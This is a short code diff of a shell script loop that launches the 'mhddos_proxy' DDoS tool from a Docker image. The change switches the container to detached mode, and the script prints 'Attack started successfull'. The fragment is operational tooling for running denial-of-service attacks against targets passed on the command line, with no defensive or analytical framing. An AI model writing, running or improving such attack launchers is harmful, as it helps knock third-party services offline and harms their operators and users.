@@ -48,7 +48,7 @@ do
             echo "$cmd_line $proxy_interval $rpc"
             
             cd ~/mhddos_proxy
-            sudo docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest $cmd_line $proxy_interval $rpc &
+            sudo docker run -d -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest $cmd_line $proxy_interval $rpc
             #nohup sudo python3 $cmd_line $proxy_interval $rpc </dev/null &>/dev/null &
             echo -e "\nAttack started successfull\n"
    done
